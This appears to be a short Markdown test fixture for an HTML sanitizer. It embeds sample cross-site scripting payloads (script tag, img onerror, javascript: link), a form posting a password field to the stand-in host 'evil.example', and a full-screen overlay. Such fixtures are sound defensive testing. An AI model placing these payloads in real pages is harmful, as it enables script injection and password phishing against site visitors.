---
title: Security
---
# Security

Raw HTML from contributors is sanitized.

<script>window.__xss = "script"</script>
<img src="x" onerror="window.__xss='onerror'">
<a href="javascript:window.__xss='link'">bad link</a>

## Forms

<form action="https://evil.example"><input name="password"></form>
<div style="position:fixed;inset:0;background:red">overlay</div>

Text after the attacks.
